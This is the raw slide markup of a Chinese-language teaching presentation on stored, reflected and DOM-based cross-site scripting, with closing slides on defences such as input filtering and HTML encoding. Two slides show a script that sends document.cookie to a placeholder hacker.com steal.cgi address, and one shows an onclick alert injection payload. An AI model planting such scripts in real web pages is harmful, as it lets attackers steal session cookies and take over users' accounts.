      <p:bldP spid="427025" grpId="0" animBg="1"/>
      <p:bldP spid="427026" grpId="0" animBg="1"/>
      <p:bldP spid="427027" grpId="0"/>
      <p:bldP spid="427028" grpId="0" animBg="1"/>
      <p:bldP spid="427029" grpId="0" animBg="1"/>
      <p:bldP spid="427030" grpId="0"/>
      <p:bldP spid="4270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7363" y="1344613"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>储存式跨站脚本攻击，也称为持久性跨站脚本攻击。如果</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>程序允许存储用户数据，并且存储的输入数据没有经过正确的过滤，就有可能发生这类攻击。在这种攻击模式下，攻击者并不需要利用一个恶意链接，只要用户访问了储存式跨站脚本网页，那么恶意数据就将显示为网站的一部分并以受害者身份执行。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US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储存式</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>XSS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储存式</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3" descr="说明: test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0057" y="1704975"/>
            <a:ext cx="526478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储存式</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="图片 4" descr="说明: xssed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5857" y="1456372"/>
            <a:ext cx="6607493" cy="190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 descr="说明: act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71177" y="3882707"/>
            <a:ext cx="2620645" cy="1397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储存式</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="430085" name="Rectangle 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1643063" y="3616325"/>
            <a:ext cx="6092825" cy="1311275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TW" sz="2000">
                <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
                <a:ea typeface="PMingLiU" pitchFamily="18" charset="-120"/>
              </a:rPr>
              <a:t>&lt;script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr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TW" sz="2000">
                <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
                <a:ea typeface="PMingLiU" pitchFamily="18" charset="-120"/>
              </a:rPr>
              <a:t>window.location="http://www.hacker.com/steal.cgi?ck="+document.cookie;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr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TW" sz="2000">
                <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
                <a:ea typeface="PMingLiU" pitchFamily="18" charset="-120"/>
              </a:rPr>
              <a:t>&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="430086" name="Text Box 6"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3614738" y="1733550"/>
            <a:ext cx="18319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/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
                <a:ea typeface="標楷體" pitchFamily="65" charset="-120"/>
              </a:rPr>
              <a:t>~</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-TW" altLang="en-US" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
                <a:ea typeface="標楷體" pitchFamily="65" charset="-120"/>
              </a:rPr>
              <a:t>留言版</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
                <a:ea typeface="標楷體" pitchFamily="65" charset="-120"/>
              </a:rPr>
              <a:t>~</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="430087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1363" y="2405063"/>
            <a:ext cx="7521575" cy="2719387"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="430088" name="Rectangle 8"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1638300" y="3592513"/>
            <a:ext cx="6092825" cy="1311275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TW" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
                <a:ea typeface="PMingLiU" pitchFamily="18" charset="-120"/>
              </a:rPr>
              <a:t>&lt;script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr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TW" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
                <a:ea typeface="PMingLiU" pitchFamily="18" charset="-120"/>
              </a:rPr>
              <a:t>window.location="http://www.hacker.com/steal.cgi?ck="+document.cookie;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr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en-US" altLang="zh-TW" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
                <a:ea typeface="PMingLiU" pitchFamily="18" charset="-120"/>
              </a:rPr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0238" y="1296988"/>
            <a:ext cx="7772400" cy="4818062"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" b="0" dirty="0" smtClean="0"/>
              <a:t>也称为非持久性跨站脚本攻击，是一种最常见的跨站脚本攻击类型。与本地脚本漏洞不同的是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="0" dirty="0" smtClean="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" b="0" dirty="0" smtClean="0"/>
              <a:t>客户端使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="0" dirty="0" smtClean="0"/>
              <a:t>Server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" b="0" dirty="0" smtClean="0"/>
              <a:t>端脚本生成页面为用户提供数据时，如果未经验证的用户数据被包含在页面中而未经</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="0" dirty="0" smtClean="0"/>
              <a:t>HTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" b="0" dirty="0" smtClean="0"/>
              <a:t>实体编码，客户端代码便能够注入到动态页面中。在这种攻击模式下，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="0" dirty="0" smtClean="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" b="0" dirty="0" smtClean="0"/>
              <a:t>程序不会存储恶意脚本，它会将未经验证的数据通过请求发送给客户端，攻击者就可以构造恶意的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="0" dirty="0" smtClean="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" b="0" dirty="0" smtClean="0"/>
              <a:t>链接或表单并诱骗用户访问，最终达到利用受害者身份执行恶意代码的目的。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" b="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反射式</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>XSS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0238" y="1296988"/>
            <a:ext cx="7772400" cy="4818062"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>(1) Alice</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>经常浏览</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Bob</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>建立的网站。</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Bob</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>的站点运行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Alice</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>使用用户名</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>密码进行登录，并存储敏感信息</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>比如银行帐户信息</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>(2) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>Charly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>发现</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Bob</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>的站点包含反射性的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>漏洞；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>(3) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>Charly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>编写一个利用漏洞的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>，并将其冒充为来自</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Bob</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>的邮件发送给</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Alice</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>； </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>(4) Alice</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>在登录到</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Bob</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>的站点后，浏览</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>Charly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>提供的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>(5) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>嵌入到</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>中的恶意脚本在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Alice</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>的浏览器中执行，就像它直接来自</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Bob</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>的服务器一样。此脚本盗窃敏感信息</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>授权、信用卡、帐号信息等</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>，然后在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Alice</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>完全不知情的情况下将这些信息发送到</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>Charly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>站点。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" b="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反射式</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>XSS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反射式</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3" descr="xss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1477010"/>
            <a:ext cx="7286625" cy="439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49288" y="1363663"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>loginsb.asp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>直接向用户显示</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>msg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>参数，这样只要简单构造一个恶意的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>就可以触发一次</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>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反射式</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="图片 4" descr="xss_src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6790" y="3020060"/>
            <a:ext cx="7280910" cy="239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DOM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>式</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>XSS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38" y="1290638"/>
            <a:ext cx="873442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 descr="dom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8345" y="5490845"/>
            <a:ext cx="4880610" cy="73406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58813" y="1296988"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>如果构造数据“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>‘ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>onclick</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>=’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>javascript:alert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>(/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>xss</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>/)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>”，那么最后添加的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>代码就变成了“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>&lt;a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>href</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>=’ ‘ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>onclick</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>=’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>javascript:alert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>(/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>xss</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>/)’&gt;test&lt;/a&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>”，插入一个</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>onclick</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>事件，点击提交按键，那么就会发生一次</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>DOM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>式</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>xss</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>攻击。</a:t>
            </a:r>
          </a:p>
          <a:p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DOM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>式</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="图片 5" descr="dom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5642" y="3757295"/>
            <a:ext cx="4793615" cy="2067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防御</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>攻击</a:t>
            </a:r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287463"/>
            <a:ext cx="8151812" cy="4894262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sz="2800" dirty="0"/>
              <a:t>对</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>应用程序的所有输入进行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>过滤</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>，对危险的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>HTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>字符进行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>编码</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>：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宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>‘&lt;’ ,  ‘&gt;’  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN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dirty="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>  ‘&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>lt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>;’      ,  ‘&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
